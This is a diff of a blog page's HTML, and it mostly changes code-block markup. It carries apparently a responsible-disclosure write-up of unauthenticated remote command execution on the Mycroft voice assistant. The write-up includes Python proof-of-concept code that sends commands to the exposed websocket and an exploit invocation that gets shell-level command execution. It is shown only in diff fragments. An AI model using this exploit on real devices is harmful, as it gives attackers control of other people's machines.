+<div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
+  <div class="
+    code-block-title 
+    
+    tw-flex 
+    tw-flex-row 
+    tw-justify-between 
+    tw-w-full tw-bg-bgColor-secondary
+    ">      
+    <button 
+      class="
+        tw-select-none 
+        tw-mx-2 
+        tw-block
+        group-[.is-open]:tw-rotate-90
+        tw-transition-[transform] 
+        tw-duration-500 
+        tw-ease-in-out
+        print:!tw-hidden"
+      disabled
+      aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></button>
+
+    <div class="code-block-title-bar tw-w-full">
+      <p class="tw-select-none !tw-my-1">python</p>
+    </div>
+    <div class="tw-flex">
+      <button 
+        class="
+          line-number-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.show-line-numbers]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle line numbers"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
+
+      <button 
+        class="
+          wrap-code-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.is-wrap]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle code wrap"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
+      
+      <button 
+        class="
+          copy-code-button
+          tw-select-none
+          tw-mx-2 
+          tw-hidden
+          group-[.is-open]:tw-block
+          hover:tw-text-fgColor-link 
+          print:!tw-hidden"
+        title="Copy code">
+          <span class="copy-icon tw-block"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M433.941 65.941l-51.882-51.882A48 48 0 0 0 348.118 0H176c-26.51 0-48 21.49-48 48v48H48c-26.51 0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51 0 48-21.49 48-48v-48h80c26.51 0 48-21.49 48-48V99.882a48 48 0 0 0-14.059-33.941zM266 464H54a6 6 0 0 1-6-6V150a6 6 0 0 1 6-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 0 1-6 6zm128-96H182a6 6 0 0 1-6-6V54a6 6 0 0 1 6-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 0 1-6 6zm6-256h-64V48h9.632c1.591 0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 0 1 1.757 4.243V112z"/></svg></span>
+          <span class="check-icon tw-hidden"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
+      </button>
+        
+      <button 
+        class="
+          tw-select-none 
+          tw-mx-2 
+          tw-block 
+          group-[.is-open]:tw-hidden 
+          print:!tw-hidden" 
+        disabled
+        aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button>
+    </div>
+  </div>
+  <pre style="counter-reset: codeblock;" class="tw-block tw-m-0 tw-p-0"><code 
+    id="codeblock-id-2" 
+    class="
+      chroma 
+      !tw-block 
+      tw-p-0
+      tw-m-0
+      tw-transition-[max-height] 
+      tw-duration-500 
+      tw-ease-in-out 
+      group-[.is-closed]:!tw-max-h-0 
+      group-[.is-wrap]:tw-text-wrap
+      tw-overflow-y-hidden
+      tw-overflow-x-auto
+      tw-scrollbar-thin
+      "><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">websockets</span>
@@ -333,10 +542,9 @@ The theme localization it&rsquo;s a pretty cool feature but having to rewrite th
 </span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">websocket</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">data</span><span class="se">\&#34;</span><span class="s2">: {</span><span class="se">\&#34;</span><span class="s2">utterances</span><span class="se">\&#34;</span><span class="s2">: [</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">command</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">]}, </span><span class="se">\&#34;</span><span class="s2">type</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">recognizer_loop:utterance</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">context</span><span class="se">\&#34;</span><span class="s2">: null}&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span></span></span></code></pre>
 </div>
-</div><p>And magically we have an answer from the vocal assistant saying <code>pwned</code>!</p>
+<p>And magically we have an answer from the vocal assistant saying <code>pwned</code>!</p>
 <p>Well, now we can have Mycroft pronounce stuff remotely, but this is not a really big finding unless you want to scare your friends, right?</p>
 <figure><img src="https://media1.tenor.com/images/8a4a99d3bd67ba8d9a025c36edf4a624/tenor.gif"><figcaption>
       <h4>WRONG</h4>
@@ -344,7 +552,7 @@ The theme localization it&rsquo;s a pretty cool feature but having to rewrite th
 </figure>
 
 <h2 id="the-skills-system" class="headerLink">
-    <a href="#the-skills-system" class="header-mark"></a>3 The skills system</h2><p>Digging deeper we can see that Mycroft has a skills system and a default skill that can install others skills (pretty neat, right?)</p>
+    <a href="#the-skills-system" class="header-mark" aria-label="Header mark for 'The skills system'"></a>3 The skills system</h2><p>Digging deeper we can see that Mycroft has a skills system and a default skill that can install others skills (pretty neat, right?)</p>
 <p>How is a skill composed? From what we can see from the documentation a default skill is composed by:</p>
 <ul>
 <li><code>dialog/en-us/command.dialog</code> contains the vocal command that will trigger the skill</li>
@@ -353,36 +561,107 @@ The theme localization it&rsquo;s a pretty cool feature but having to rewrite th
 <li><code>__int__.py</code> contains the main function of the skill and will be loaded when the skill is triggered</li>
 </ul>
 <h2 id="what-can-i-do-now" class="headerLink">
-    <a href="#what-can-i-do-now" class="header-mark"></a>4 What can I do now?</h2><p>I could create a malicious skill that when triggered runs arbitrary code on the remote machine, but unfortunately this is not possible via vocal command unless the URL of the skill is not whitelisted via the online website. So this is possible but will be a little tricky.</p>
+    <a href="#what-can-i-do-now" class="header-mark" aria-label="Header mark for 'What can I do now?'"></a>4 What can I do now?</h2><p>I could create a malicious skill that when triggered runs arbitrary code on the remote machine, but unfortunately this is not possible via vocal command unless the URL of the skill is not whitelisted via the online website. So this is possible but will be a little tricky.</p>
 <h3 id="so-im-done" class="headerLink">
-    <a href="#so-im-done" class="header-mark"></a>4.1 So I&rsquo;m done?</h3><p>Not yet. I found out that I can trigger skills remotely and that is possible to execute commands on a remote machine convincing the user to install a malicious skill. I may have enough to submit a vulnerability report. But maybe I can do a bit better&hellip;</p>
+    <a href="#so-im-done" class="header-mark" aria-label="Header mark for 'So I&amp;rsquo;m done?'"></a>4.1 So I&rsquo;m done?</h3><p>Not yet. I found out that I can trigger skills remotely and that is possible to execute commands on a remote machine convincing the user to install a malicious skill. I may have enough to submit a vulnerability report. But maybe I can do a bit better&hellip;</p>
 <h2 id="getting-a-remote-shell-using-default-skills" class="headerLink">
-    <a href="#getting-a-remote-shell-using-default-skills" class="header-mark"></a>5 Getting a remote shell using default skills</h2><p>We know that Mycroft has some <a href="https://github.com/MycroftAI/mycroft-skills" target="_blank" rel="noopener noreferrer">default skills</a> like <code>open</code> that will open an application and others that are whitelisted but not installed. Reading through to the list, I found a really interesting skill called <code>skill-autogui</code>, whose description says <code>Manipulate your mouse and keyboard with Mycroft</code>. <strong>We got it!</strong></p>
+    <a href="#getting-a-remote-shell-using-default-skills" class="header-mark" aria-label="Header mark for 'Getting a remote shell using default skills'"></a>5 Getting a remote shell using default skills</h2><p>We know that Mycroft has some <a href="https://github.com/MycroftAI/mycroft-skills" target="_blank" rel="noopener noreferrer">default skills</a> like <code>open</code> that will open an application and others that are whitelisted but not installed. Reading through to the list, I found a really interesting skill called <code>skill-autogui</code>, whose description says <code>Manipulate your mouse and keyboard with Mycroft</code>. <strong>We got it!</strong></p>
 <p>Let&rsquo;s try to combine everything we found so far into a PoC:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+<div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
+  <div class="
+    code-block-title 
+    
+    tw-flex 
+    tw-flex-row 
+    tw-justify-between 
+    tw-w-full tw-bg-bgColor-secondary
+    ">      
+    <button 
+      class="
+        tw-select-none 
+        tw-mx-2 
+        tw-block
+        group-[.is-open]:tw-rotate-90
+        tw-transition-[transform] 
+        tw-duration-500 
+        tw-ease-in-out
+        print:!tw-hidden"
+      disabled
+      aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></button>
+
+    <div class="code-block-title-bar tw-w-full">
+      <p class="tw-select-none !tw-my-1">python</p>
+    </div>
+    <div class="tw-flex">
+      <button 
+        class="
+          line-number-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.show-line-numbers]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle line numbers"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
+
+      <button 
+        class="
+          wrap-code-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.is-wrap]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle code wrap"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
+      
+      <button 
+        class="
+          copy-code-button
+          tw-select-none
+          tw-mx-2 
+          tw-hidden
+          group-[.is-open]:tw-block
+          hover:tw-text-fgColor-link 
+          print:!tw-hidden"
+        title="Copy code">
+          <span class="copy-icon tw-block"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M433.941 65.941l-51.882-51.882A48 48 0 0 0 348.118 0H176c-26.51 0-48 21.49-48 48v48H48c-26.51 0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51 0 48-21.49 48-48v-48h80c26.51 0 48-21.49 48-48V99.882a48 48 0 0 0-14.059-33.941zM266 464H54a6 6 0 0 1-6-6V150a6 6 0 0 1 6-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 0 1-6 6zm128-96H182a6 6 0 0 1-6-6V54a6 6 0 0 1 6-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 0 1-6 6zm6-256h-64V48h9.632c1.591 0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 0 1 1.757 4.243V112z"/></svg></span>
+          <span class="check-icon tw-hidden"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
+      </button>
+        
+      <button 
+        class="
+          tw-select-none 
+          tw-mx-2 
+          tw-block 
+          group-[.is-open]:tw-hidden 
+          print:!tw-hidden" 
+        disabled
+        aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button>
+    </div>
+  </div>
+  <pre style="counter-reset: codeblock;" class="tw-block tw-m-0 tw-p-0"><code 
+    id="codeblock-id-3" 
+    class="
+      chroma 
+      !tw-block 
+      tw-p-0
+      tw-m-0
+      tw-transition-[max-height] 
+      tw-duration-500 
+      tw-ease-in-out 
+      group-[.is-closed]:!tw-max-h-0 
+      group-[.is-wrap]:tw-text-wrap
+      tw-overflow-y-hidden
+      tw-overflow-x-auto
+      tw-scrollbar-thin
+      "><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
@@ -400,25 +679,24 @@ The theme localization it&rsquo;s a pretty cool feature but having to rewrite th
 </span></span><span class="line"><span class="cl">            <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">data</span><span class="se">\&#34;</span><span class="s2">: {</span><span class="se">\&#34;</span><span class="s2">utterances</span><span class="se">\&#34;</span><span class="s2">: [</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">]}, </span><span class="se">\&#34;</span><span class="s2">type</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">recognizer_loop:utterance</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">context</span><span class="se">\&#34;</span><span class="s2">: null}&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">sendPayload</span><span class="p">())</span></span></span></code></pre>
 </div>
-</div><p>Running the exploit with <code>python pwn.py &quot;install autogui&quot; &quot;open xterm&quot; &quot;type echo pwned&quot; &quot;press enter&quot;</code>  allowed me to finally get a command execution on a Linux machine.</p>
+<p>Running the exploit with <code>python pwn.py &quot;install autogui&quot; &quot;open xterm&quot; &quot;type echo pwned&quot; &quot;press enter&quot;</code>  allowed me to finally get a command execution on a Linux machine.</p>
 <figure><img src="https://raw.githubusercontent.com/Nhoya/MycroftAI-RCE/master/PoC.gif"><figcaption>
       <h4>PoC</h4>
     </figcaption>
 </figure>
 
 <h2 id="_notes_" class="headerLink">
-    <a href="#_notes_" class="header-mark"></a>6 <em>Notes</em></h2><ul>
+    <a href="#_notes_" class="header-mark" aria-label="Header mark for '&lt;em&gt;Notes&lt;/em&gt;'"></a>6 <em>Notes</em></h2><ul>
 <li><code>open xterm</code> was needed because my test Linux environment had a DE installed, on a remote server the commands will be executed directly on TTY so this step is not nesessary.</li>
 <li>The skill branching had a <a href="https://mycroft.ai/blog/skill-branching-18-02/" target="_blank" rel="noopener noreferrer">big change</a> and now some skills are not (yet) available (autogui is one of them) but this is not the real point. Mycroft has skills to interact with domotic houses and other services that can still be manipulated (the lack of imagination is the limit here). The vulnerability lies in the lack of authentication for the ws.</li>
 </ul>
 <h2 id="affected-devices" class="headerLink">
-    <a href="#affected-devices" class="header-mark"></a>7 Affected devices</h2><pre><code>All the devices running Mycroft &lt;= ? with the websocket server exposed (Mark-I has the websocket behind a firewall by default)
+    <a href="#affected-devices" class="header-mark" aria-label="Header mark for 'Affected devices'"></a>7 Affected devices</h2><pre><code>All the devices running Mycroft &lt;= ? with the websocket server exposed (Mark-I has the websocket behind a firewall by default)
 </code></pre>
 <h2 id="timeline" class="headerLink">
-    <a href="#timeline" class="header-mark"></a>8 Timeline</h2><ul>
+    <a href="#timeline" class="header-mark" aria-label="Header mark for 'Timeline'"></a>8 Timeline</h2><ul>
 <li>08/03/2018 Vulnerability found</li>
 <li>09/03/2018 Vulnerability reported</li>
 <li>13/03/2018 The CTO answered that they are aware of this problem and are currently working on a patch</li>
